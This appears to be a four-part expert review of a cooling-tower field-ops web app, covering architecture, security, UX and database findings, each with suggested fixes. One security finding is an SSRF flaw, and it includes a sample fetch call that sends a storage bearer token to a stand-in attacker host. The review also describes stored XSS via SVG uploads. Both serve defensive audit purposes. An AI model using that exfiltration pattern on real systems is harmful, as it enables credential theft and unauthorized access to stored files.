# Expert Review — Cooling Tower Field Ops App

**Date:** 2026-07-05  
**Scope:** Phase 1 + Phase 2a codebase, reviewed against Phase 2b–2e plans  
**Reviewers:** Solution Architect · Security Architect · UX Expert · Database Expert

**Severity key:** 🔴 Critical — fix before next deploy or Phase 2 begins · 🟡 Important — fix before the affected Phase 2 module ships · 🟢 Minor — worth addressing but not blocking

---

## Solution Architecture Review

### 1. Architecture Fitness

The overall architecture is well-matched to this use case. Next.js 14 App Router + Prisma/Neon + Clerk is a defensible, low-operational-overhead stack for a 10–50-user internal ops app. Direct DB access from Route Handlers without an intermediate service layer is appropriate at this scale, and the Zod validation + `requireRole` pattern is applied consistently across routes. The main structural risks are in specific implementation gaps described below, not in the technology choices.

---

### 2. Critical Findings

**🔴 Synchronous CPU-bound PDF generation inside an API handler**

`src/app/api/compliance/documents/route.ts` lines 51–68. The POST handler calls `generatePdf()` → `renderToBuffer()` synchronously before returning. `renderToBuffer` is CPU-bound React tree rendering + PDF encoding. On a complex SWMS template with signature images it can take 3–8 seconds. On a cold start (Neon + react-pdf module init) this adds to a 2–3s baseline.

A technician on a flaky mobile connection who retries will cause a second concurrent invocation while the DB record from the first attempt is already created. The cleanup at line 66 (`db.complianceDocument.delete(…).catch(() => {})`) silently discards cleanup errors — orphaned rows result. Phase 2d invoice PDFs will have exactly the same problem.

**Fix:** Move PDF generation to a background job (Inngest or Trigger.dev). Store a `pdfStatus: "pending" | "ready" | "failed"` on the document. Return `202 Accepted` and push-notify when ready. At minimum, wrap `renderToBuffer` in a 10s `Promise.race` timeout.

---

**🔴 DB round-trip on every authenticated request**

`src/lib/auth/clerk.ts` lines 14–49. `getSessionUser()` executes `db.user.findUnique()` on every API call, plus a `currentUser()` call to the Clerk API on the JIT provision path. More critically: stale DB roles are never re-checked against Clerk metadata. If a webhook delivery fails after a role change, the DB role diverges permanently until the next JIT trigger — which never fires for existing users.

**Fix:** Embed `{ dbUserId, role }` as Clerk JWT claims via `publicMetadata`. Read them from `auth().sessionClaims` without touching Neon. Reserve DB lookup for first-sign-in JIT only.

---

### 3. Important Findings

**🟡 `DELETE /api/jobs/:id` throws unhandled P2003 on jobs with related records**

`src/app/api/jobs/[id]/route.ts` line 33: `await db.job.delete(…)` has no try/catch and no guard. The schema defines no `onDelete: Cascade` on `Assignment`, `TimeEntry`, `Variation`, `Invoice`, or `ComplianceDocument` relations to `Job`. Deleting a job with any related record throws Prisma error `P2003` and propagates as an unhandled 500. **Fix:** Implement soft delete (`deletedAt DateTime?`) or add explicit try/catch handling `P2002`/`P2003`/`P2025`.

**🟡 Invoice model is unfit for Phase 2d without schema migration and flow refactor**

The current `Invoice` model (schema lines 121–130) has only `id`, `jobId`, `baseAmount`, `variationsTotal`, `totalAmount`, `createdAt`. Missing: `status`, `invoiceNumber`, `dueDate`, `pdfUrl`, `emailSentAt`. Worse, Invoice records are auto-created as a side-effect inside the variation approval transaction with `baseAmount: 0`, meaning the base labour cost is never captured. Phase 2d requires: (1) schema migration for missing fields, (2) removing the auto-creation side-effect, (3) an explicit "generate invoice" action. **Fix:** Run the schema migration during Phase 2c so production invoice rows are migrated before 2d begins.

**🟡 No pagination on high-growth collections**

`GET /api/compliance/documents` fetches every document with three joined tables — no `take`/`skip`. `GET /api/jobs/hours` fetches all active/scheduled jobs then loads all their time entries. Phase 2b quoting adds a third unbounded query. **Fix:** Add cursor-based or offset pagination to all collection endpoints before Phase 2b ships.

**🟡 Assignment unique constraint and hardcoded 14-day window will block Phase 2c**

`prisma/schema.prisma` line 83: `@@unique([userId, jobId, assignedDate])`. Phase 2c drag-and-drop needs re-assignment (delete + create). The 14-day window in `schedule/assignments/route.ts` line 13 is not parameterised — no `?start=&end=` query params — so the calendar view cannot query arbitrary ranges without a route change.

---

### 4. Missing Infrastructure

**🟡 No rate limiting on any API route.** `/api/team/invite` calls Clerk's invitation API without throttle. `/api/time/clock-in` and `/api/push/subscribe` are unprotected. **Fix:** Add `@upstash/ratelimit` middleware on invite (5/min per user) and push-subscribe (10/min per user) endpoints.

**🟡 No error observability.** No Sentry, no structured logging — only scattered `console.error`. Silent failures in PDF generation, push delivery, and blob uploads are swallowed. **Fix:** Add Sentry (free tier sufficient) before Phase 2d ships email — unmonitored Resend failures will cause undetected missed invoices.

**🟡 `web-push` module-level side effect.** `src/lib/push/vapid.ts` lines 3–7: `webpush.setVapidDetails(…)` runs at module import time with `!` non-null assertions. Any route importing this in an environment missing `VAPID_PRIVATE_KEY` fails to load with a cryptic error. **Fix:** Move the call inside `sendPushToUser` with an explicit env guard.

---

### 5. Prioritised Recommendations

1. **Move PDF generation out of the synchronous request cycle** — Inngest or Trigger.dev, `pdfStatus` field, `202 Accepted` response.
2. **Eliminate per-request DB auth lookups** — embed `dbUserId` + `role` in Clerk JWT claims.
3. **Soft-delete pattern on Job and cascading error handling** — prevents production 500s from director deletes.
4. **Extend Invoice schema before Phase 2d begins** — do this during Phase 2c so row migration happens before 2d invoicing is live.
5. **Add pagination to all collection endpoints** — before Phase 2b ships.
6. **Add env validation module** — Zod schema validating all required env vars at server start.
7. **Wire error tracking (Sentry)** — before Phase 2d ships email.
8. **Rate-limit invite and push-subscribe endpoints** — before full headcount onboards.

---

## Security Architecture Review

### 1. Authentication & Authorisation

`requireRole()` is consistently called on all mutating endpoints. The dual-layer architecture (Clerk middleware + per-route guard) provides defence in depth. Three issues:

- 🟡 **`/api/upload/photo` is middleware-public but route-guarded.** The middleware exception is redundant — the route-level `requireRole(["technician"])` would reject unauthenticated calls anyway. The exception leaves the route reachable by unauthenticated requests that hit the route guard. Functionally safe today but creates ambiguity about the public surface area.
- 🟢 **`/api/health` has zero auth.** Returns `{"status":"ok","db":"ok"}` to the public — confirms app and database operational status. Useful reconnaissance.
- 🟢 **`GET /api/settings` is readable by all roles** including `technician` and `draftsman`. ABN and business email may be unintended exposure.

---

### 2. Critical: SSRF via Substring Hostname Check

**🔴 SSRF + token exfiltration in `/api/photos`** (`src/app/api/photos/route.ts` line 12).

The guard is `blobUrl.includes(".blob.vercel-storage.com")`. This is a substring check, not a hostname parse. An attacker-controlled URL like `https://attacker.example.com/.blob.vercel-storage.com/x` passes the check. The server then issues:

```
fetch("https://attacker.example.com/...", {
  headers: { Authorization: `Bearer ${BLOB_READ_WRITE_TOKEN}` }
})
```

The `BLOB_READ_WRITE_TOKEN` is exfiltrated to the attacker's server. With that token the attacker has full read/write/delete access to all blobs — compliance PDFs, logos, variation photos. Any authenticated user (including a new hire technician) can trigger this.

**Fix:** Parse the URL with `new URL(blobUrl)` and assert `hostname.endsWith(".blob.vercel-storage.com")`.

---

### 3. IDOR / Access Control

**🔴 Variation submission has no job-assignment gate** (`src/app/api/variations/route.ts` POST handler lines 35–41). A `technician` can submit a variation against any `active` or `scheduled` job regardless of whether they are assigned to it. Compare to clock-in (`time/clock-in/route.ts` lines 32–37), which correctly enforces assignment membership. An off-site or offboarded technician could submit fraudulent cost-estimate variations on any job.

**🟡 `GET /api/compliance/documents` returns all documents to all roles** with no ownership or assignment filter (`documents/route.ts` lines 14–27). The Prisma query has no `where` clause. A `sales_engineer` or `draftsman` can enumerate all SWMS/JSA/WHS documents and obtain their private PDF URLs.

**🟢 `GET /api/compliance/documents/[id]` has no ownership check.** Any authenticated user who knows a document UUID can retrieve the full record including the private `pdfUrl`.

---

### 4. Input Validation

**🟡 Variation photo upload has no content-type validation** (`src/app/api/upload/photo/route.ts`). The handler checks only file size; there is no `file.type` or magic-bytes check. An authenticated technician can upload an SVG or polyglot file. The photo proxy serves it with whatever `Content-Type` the blob returns. A malicious SVG served as `image/svg+xml` in a browser context can execute arbitrary JavaScript — stored XSS. Compare the logo upload (`settings/logo/route.ts` lines 6–7) which correctly allowlists `["image/png","image/jpeg","image/webp"]`.

**🟡 Logo MIME validation relies on client-supplied `file.type`** (`settings/logo/route.ts` line 22). `file.type` can be set to `image/png` by the uploader regardless of actual file content. Logo blobs are stored with `access: "public"`. **Fix:** Use a magic-bytes library (e.g. `file-type`) to verify actual content.

**🟢 Compliance document `values` is `z.record(z.string(), z.any())`** — arbitrary deeply-nested objects can be submitted. If `generatePdf` iterates values without depth/size limits, a malicious payload could cause unbounded memory allocation during PDF generation.

---

### 5. Webhook Security

**🟢 Clerk webhook correctly verified** (`src/app/api/webhooks/clerk/route.ts`). All three svix headers required, payload read as raw text before verification, `wh.verify()` called before any DB mutation. Correctly implemented.

Minor: the `user.updated` path writes the role from `public_metadata` to the DB without validating it's one of the six `UserRole` values. An unexpected metadata value persists to the DB and would throw at the Prisma enum level — not a silent corruption but produces an unhandled 500.

---

### 6. Secrets & Environment Variables

**🟡 No startup validation of required environment variables.** `DATABASE_URL`, `CLERK_SECRET_KEY`, `BLOB_READ_WRITE_TOKEN`, `VAPID_PRIVATE_KEY` are all read with `!` non-null assertions. A misconfigured deployment produces a runtime exception on first use rather than a startup failure. **Fix:** Add a Zod env validation block that runs at module load.

**🟢 Hardcoded fallback URL in invite route** (`src/app/api/team/invite/route.ts` line 23): `process.env.NEXT_PUBLIC_APP_URL ?? "https://cooling-tower-app-alpha.vercel.app"`. A staging/preview deployment would send invitation redirect URLs pointing to the live production app.

---

### 7. Phase 2 Risk Register

- **Customer email addresses are PII** under the Australian Privacy Act. Store on the `Customer` model with role-gating — not on `Job` where all roles currently have full read access.
- **Resend emails containing variation photos**: private blob URLs won't work for email recipients (no Clerk session). Fetch server-side and embed as data URIs or generate time-limited signed URLs.
- **Scheduling API** (`/api/schedule/assignments` POST) accepts arbitrary `userId`/`jobId` UUIDs without verifying active users and non-cancelled jobs. Add explicit existence/status checks before inserting.
- **Invoice PDF injection**: variation `description` and compliance document `values` are written by technicians and injected into PDFs. Confirm `@react-pdf/renderer` escapes special characters.
- **`DELETE /api/schedule/assignments/[id]`** calls `db.assignment.delete` directly and returns an unhandled Prisma `P2025` rather than a 404 for invalid IDs.

---

## UX Review

### 1. Critical — Mobile Technician Issues

**🔴 No bottom tab bar — hamburger drawer is wrong for field use**

`src/components/nav/MobileNavClient.tsx`. The primary navigation is a hamburger drawer requiring a tap in the top-left corner — the hardest position to reach one-handed in work gloves. Technicians have at most 3 nav items (Time Tracking, Compliance, Variations). A persistent bottom tab bar with those three items would be dramatically faster. The drawer can be retained for admin roles with wider nav sets.

**🔴 Clock-in is blocked if the technician has no assignment** (`time-tracking/page.tsx`)

Jobs shown on the clock card are gated to today's schedule assignments. If a technician isn't formally assigned, `jobs` is empty and they see "No jobs scheduled for today" with no fallback. A tradie who turns up to an unassigned job is completely blocked from clocking in.

**🔴 Signature canvas coordinate bug** (`SignatureCanvas.tsx`)

The outer wrapper is capped at `height: 100px` but the internal canvas is `height={150}`. The canvas is squashed and the coordinate mapping `canvas.height / rect.height` is off — drawn strokes appear in the wrong vertical position. The wrapper height must match the canvas height (minimum 150px; 200px recommended for gloved use).

**🔴 Signature invisible in dark mode** (`SignatureCanvas.tsx` line 19)

Stroke colour is hardcoded `#1e293b` (dark slate). In dark mode the canvas background is `dark:bg-slate-900` — the stroke is invisible. A technician in dark mode cannot sign a compliance document.

```tsx
// Fix: respect colour scheme
ctx.strokeStyle = window.matchMedia("(prefers-color-scheme: dark)").matches
  ? "#e2e8f0"   // slate-200
  : "#1e293b";  // slate-800
```

**🔴 Step 1 select auto-zooms on iOS** (`ComplianceForm.tsx` line 94)

The job select uses `text-sm` (14px). iOS Safari auto-zooms on any input below 16px. Change to `text-base` on all form inputs to suppress the jarring zoom.

**🔴 No photo preview after upload** (`VariationForm.tsx`)

After upload, feedback is a small green text line ("Photo uploaded ✓"). A technician in gloves cannot verify they captured the right image. Add an 80–120px thumbnail preview with a "Retake" button.

---

### 2. Navigation

**🟡 Hamburger button is 36×36px** (`MobileNavClient.tsx`) — below the 44px iOS HIG minimum. Expand to `h-11 w-11`.

**🟡 Dead settings link.** `NavLinks.tsx` has `href="#"` for the Settings footer link — clicks go nowhere. Link to `/settings` and gate to `director`/`admin` only.

**🟡 `admin` role cannot see Schedule** (`nav-config.ts` line 79, `visibleTo: ["service_manager", "director"]`). Admins who manage assignments need schedule access.

**🟡 Phase badges are visible to technicians** (`NavLinks.tsx`). "1a", "1b", "2" labels are internal vocabulary that mean nothing to end users. Add `aria-hidden="true"` and hide in production, or limit to admin roles.

**🟡 Version label mismatch.** Desktop sidebar shows "Phase 1a", mobile shows "Phase 1b". Remove or unify to a single source.

**🟡 Notification bell shows amber dot always** (`TopBar.tsx`). A persistent false-positive unread badge erodes trust. Remove the dot until push notifications are wired to the bell.

---

### 3. Compliance Form — Full Finding Table

| Issue | Severity | Location |
|---|---|---|
| Signature canvas height mismatch (coordinate bug) | 🔴 | `SignatureCanvas.tsx:88` |
| Dark mode signature invisible | 🔴 | `SignatureCanvas.tsx:19` |
| Step 1 select `text-sm` → iOS auto-zoom | 🔴 | `ComplianceForm.tsx:94` |
| No step progress indicator (no "Step 1 of 3") | 🟡 | `ComplianceForm.tsx:26` |
| Bulk error message, no per-field highlight | 🟡 | `ComplianceForm.tsx:53–56` |
| Text inputs `min-h-[40px]` — below 44px minimum | 🟡 | `ComplianceForm.tsx:176` |
| No draft auto-save — data lost on navigation | 🟡 | `ComplianceForm.tsx` |
| Photo file input is unstyled native control | 🟡 | `VariationForm.tsx` |
| Canvas has no `aria-label` | 🟡 | `SignatureCanvas.tsx:89` |
| Back button is tiny underlined text | 🟢 | `ComplianceForm.tsx:148, 243` |

---

### 4. Desktop Admin/Director Experience

**🟡 Jobs page shows cards on desktop** (`JobsClient.tsx`). On a 1440px screen a vertical card stack wastes 70% of horizontal space. Use a responsive table (`cards` on mobile, `<table>` on `lg:`) with sortable columns.

**🟡 No search or filter on Jobs page.** An admin managing 50+ jobs cannot find a customer without scrolling.

**🟡 Variation cost shown as integer** (`VariationCard.tsx`). `toFixed(0)` means $312.50 shows as $312. For financial approval decisions, show two decimal places.

**🟡 Portrait photos crop incorrectly** (`VariationCard.tsx`). Photos are forced to `aspect-video`, cropping subjects. Use `max-h-64 object-contain` instead.

**🟡 "Queried" is jargon** for tradespeople and directors. Use "Request more info" or "Send back".

**🟡 No way to view previously decided variations.** Only `status: "pending"` is shown. Add a "Show decided" toggle for audit trail access.

**🟡 Schedule shows only 14 days, hardcoded** (`ScheduleClient.tsx`). Add prev/next week navigation. Assignment creation modal doesn't show existing assignments for the selected date — admins can't detect conflicts when creating.

**🟡 Dashboard missing KPI tiles.** A director gets no at-a-glance numbers (jobs active today, pending variations count, crew currently clocked in). Add stat tiles above the crew board.

---

### 5. Accessibility

**🔴 Multiple `<label>` elements lack `htmlFor`/`id` pairing** across `ClockCard`, `VariationForm`, and `ComplianceForm`. Tapping a label on iOS does not focus the input. Screen readers announce inputs without labels. All labels must programmatically reference their control. (WCAG 1.3.1 failure.)

**🔴 Amber-500 on white fails WCAG AA contrast** (~2.97:1 vs 4.5:1 required for normal text). Primary CTA buttons (Clock In, Submit, Assign) fail. Technicians reading in direct sunlight need maximum contrast. **Fix:** Use `bg-amber-600` as default (`#D97706`, ~3.9:1) — still marginal for normal text but better. For fully accessible buttons, use `bg-slate-900 text-white`.

**🟡 No focus trap in modals** (`JobsClient.tsx`, `ScheduleClient.tsx`). Tab key escapes the modal overlay. Use `focus-trap-react` or a custom `useEffect` constraining focus.

**🟡 `dark:hover:bg-slate-850` is not a valid Tailwind class** (`NavLinks.tsx`). Tailwind slate scale ends at 900. Silently produces no style. Use `dark:hover:bg-slate-800`.

---

### 6. Phase 2 Reusable Component Opportunities

- **`<BottomSheet>`** — the modal shell (`fixed inset-0 z-50 flex items-end sm:items-center`) is duplicated in `JobsClient` and `ScheduleClient`. Extract with `title`, `onClose`, `children` props.
- **`<AssignmentChip>`** — extract from `AssignmentRow` in `ScheduleClient`. The Phase 2c week grid will reuse these chips inside a CSS grid layout.
- **`<DecisionButtons>`** — the approve/reject/query trio in `VariationCard` will be reused for invoice approval in Phase 2d.
- **`<QuotaBar>`** — the hours progress bar in `JobCard` maps directly to a budget utilisation bar for Phase 2d invoices. Extract now.
- **Customer name combobox** — add a `<datalist>` autocomplete to the `customerName` input in `NewJobForm` now. It normalises data before Phase 2e Customer records land, reducing deduplication work.

---

## Database Review

### 1. Critical Schema Issues

**🔴 Monetary values use `Float` (DOUBLE PRECISION) throughout**

`Invoice.baseAmount`, `Invoice.variationsTotal`, `Invoice.totalAmount`, and `Variation.costEstimate` are all `Float`. IEEE 754 doubles cannot represent many decimal fractions exactly — `$10.10 + $0.20` may equal `$10.299999999998` in the DB. For an invoicing system, this is a correctness bug. All monetary columns must be migrated to `Decimal` (PostgreSQL `NUMERIC(12,2)`).

**🔴 `Invoice.totalAmount` is a stored derived column with no enforcement**

`totalAmount` is always supposed to equal `baseAmount + variationsTotal`, but this invariant is upheld only in application code. In `variations/[id]/decision/route.ts` lines 53–57 both columns are updated individually. A bug or direct DB write can desync them silently. **Fix:** Add a PostgreSQL check constraint `CHECK (totalAmount = baseAmount + variationsTotal)`, or remove `totalAmount` as a stored column and compute it in the application layer.

**🔴 Clock-in has a TOCTOU race condition with no DB enforcement**

`clock-in/route.ts` lines 22–29 check for an active entry then insert one — two separate statements with no transaction. Two concurrent requests from the same user can both pass the `findFirst` check before either insert completes, creating two active entries. **Fix:** Add a partial unique index at the DB level:

```sql
CREATE UNIQUE INDEX "one_active_entry_per_user"
  ON "TimeEntry"("userId") WHERE status = 'active';
```

This must be added via raw migration SQL since Prisma doesn't support partial indexes declaratively. The application-level check becomes a friendly pre-flight; the DB constraint is the real guard.

---

### 2. Missing Indexes

**🔴 `Assignment` FK columns have no indexes**

`Assignment.userId` and `Assignment.jobId` have no dedicated indexes. PostgreSQL does not auto-create indexes on FK columns (that's MySQL behaviour). The composite `@@unique([userId, jobId, assignedDate])` handles queries leading with `userId`, but `GET /api/schedule/assignments` queries `WHERE assignedDate BETWEEN start AND end` — this cannot use the composite unique index. **Fix:** Add `@@index([assignedDate])` to `Assignment`.

**🔴 `Invoice.jobId` has no index**

`variations/[id]/decision/route.ts` line 50: `tx.invoice.findFirst({ where: { jobId: variation.jobId } })`. Every variation approval does a full `Invoice` table scan. **Fix:** Add `@@index([jobId])` to `Invoice`.

**🟡 `TimeEntry.jobId` has no index**

Dashboard and `jobs/hours/route.ts` both load jobs with nested `timeEntries`. Prisma issues a secondary `WHERE jobId IN (...) AND status = 'complete'` query. With no index on `jobId`, this is a full scan. **Fix:** Add `@@index([jobId, status])` to `TimeEntry`.

**🟡 `ComplianceDocument.templateId` has no index**

Template-based reports and deactivation queries scan the full table. **Fix:** Add `@@index([templateId])`.

---

### 3. Query Patterns

**🟡 Variation decision reads outside the transaction then acts inside it**

`variations/[id]/decision/route.ts` lines 29–32 fetch the variation and check `status !== 'pending'` outside the transaction. Two concurrent decision requests both pass the pre-check, then both attempt the update inside separate transactions. The second transaction silently updates an already-decided variation. **Fix:** Move the status check inside the transaction with `where: { id, status: 'pending' }` in the `tx.variation.update` call — Prisma throws `P2025` if the row no longer matches.

**🟡 `GET /api/compliance/documents` fetches all documents unbounded**

`documents/route.ts` line 18: `findMany` with no `take` or cursor, and the `values: Json` field on every row can be large. **Fix:** Add pagination and exclude `values` from the list endpoint — move it to `GET /api/compliance/documents/[id]` only.

---

### 4. Data Integrity Issues

**🟡 No unique constraint on `Invoice.jobId`**

The application treats each job as having at most one invoice (decision route does `findFirst`), but no DB constraint prevents multiple invoices per job. A race condition in the decision route could create duplicates. **Fix:** Add `@@unique([jobId])` to `Invoice` if one-invoice-per-job is the intended model.

**🟡 `Variation.status` / `directorDecision` are redundant columns**

Both fields use `VariationStatus` and are always written together. In practice they are always equal once decided. Simplify to a single `status` column — if an audit trail is needed, `decidedAt` already captures the transition.

**🟡 `ComplianceDocument.submittedAt` and `createdAt` are both `DateTime @default(now())`**

They will always be identical at creation and neither is updatable. The difference is undocumented. Remove one before the table grows large.

**🟡 `BusinessProfile` has no singleton constraint**

`findFirst()` is called with no determinism guarantee. A second row could be inserted at any time. **Fix:** Add a check constraint or synthetic `@@unique` sentinel to enforce one row.

**🟢 `User.phone String @default("")` uses empty string as null sentinel**

Prevents `IS NULL` queries and interferes with uniqueness checks. Change to `phone String?`.

---

### 5. Phase 2 Schema Readiness

**🔴 `invoiceNumber String @unique` will break migration if existing Invoice rows exist**

Adding a non-nullable unique column to a populated table fails in PostgreSQL unless a `DEFAULT` is supplied. **Fix:** Three-step migration: (1) add `invoiceNumber String?`, (2) backfill with a data migration, (3) apply `NOT NULL` + unique constraint.

**🟡 `Customer` model FK on `Job` creates a dual-source-of-truth problem**

When `customerId String?` is added to `Job`, both `customerName` (free text) and `customer.name` (FK) exist. A decision must be made before the migration: either drop `customerName` after backfilling into `Customer` rows, or keep it as an explicit cache with a trigger/application-level sync. Failing to decide leaves both columns populated with no enforcement they agree.

**🟡 `Customer.abn` should have a format check constraint**

ABN is an 11-digit Australian identifier. A DB-level `CHECK (abn ~ '^\d{11}$')` is the minimum guard. Full checksum validation belongs in the application layer.

**🟢 `InvoiceStatus` enum is missing `cancelled`**

`draft | sent | paid` covers the happy path but not a job that's cancelled after an invoice is issued. Adding to a PostgreSQL enum later is a non-transactional `ALTER TYPE ... ADD VALUE` that cannot be rolled back inside a migration. Add `cancelled` before rollout.

**🟡 No `updatedAt` on `Job`, `TimeEntry`, `Assignment`, or `Variation`**

Phase 2 optimistic locking and audit feeds will need `updatedAt`. Add `updatedAt DateTime @updatedAt` to `Job` at minimum — safe `ALTER TABLE ... ADD COLUMN DEFAULT now()`.

---

## Cross-Cutting Summary

The highest-priority items across all four reviews — ordered by risk to the business:

| # | Finding | Reviews | Effort |
|---|---|---|---|
| 1 | SSRF via substring URL check in `/api/photos` — `BLOB_READ_WRITE_TOKEN` exfiltration | Security 🔴 | 1 line |
| 2 | Float monetary types — billing correctness bug | DB 🔴 | Schema migration |
| 3 | TOCTOU race on clock-in — partial unique index needed | DB 🔴 | Raw migration SQL |
| 4 | Variation submission has no job-assignment gate — fraud risk | Security 🔴 | 5 lines |
| 5 | Synchronous PDF generation — timeout and orphaned rows | Architecture 🔴 | Background job |
| 6 | Signature canvas coordinate bug + dark mode invisible | UX 🔴 | 10 lines |
| 7 | `label` / `htmlFor` missing across mobile forms | UX 🔴 | 30 min |
| 8 | iOS auto-zoom on `text-sm` inputs | UX 🔴 | Global find-replace |
| 9 | Missing indexes on `Invoice.jobId`, `Assignment.assignedDate`, `TimeEntry.jobId` | DB 🔴 | Migration |
| 10 | Variation decision race outside transaction | DB 🟡 | 3 lines |
| 11 | No error observability (Sentry) | Architecture 🟡 | 30 min setup |
| 12 | No bottom tab bar for mobile technicians | UX 🔴 | New component |
| 13 | Clock-in blocked if no schedule assignment | UX 🔴 | RBAC + fallback |
| 14 | Compliance docs visible to all roles (no access filter) | Security 🟡 | 2 lines |
| 15 | Per-request DB round-trip for auth | Architecture 🔴 | JWT claims |
